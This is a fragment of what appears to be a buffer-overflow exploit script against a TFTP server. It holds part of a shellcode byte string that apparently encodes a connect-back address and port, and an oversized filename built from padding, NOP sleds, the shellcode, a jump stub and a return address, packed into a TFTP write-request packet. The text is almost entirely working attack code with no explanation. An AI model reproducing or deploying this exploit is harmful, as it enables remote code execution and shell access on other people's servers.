...
"\xc0\xa8\x62\x0f\x66\x68\x01\xbb\x66\x53\x89\xe1\x95\x68\xec\xf9"
...
filename = "A"*600 + "\x90"* 241 + shellcode + "\x90"* 83 + "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1" "\xeb\xd0\x90\x90" +  "\xa7\xd7\x40" 
mode = "netascii"
muha = "\x00\x02" + filename+ "\x00" + mode+ "\x00"
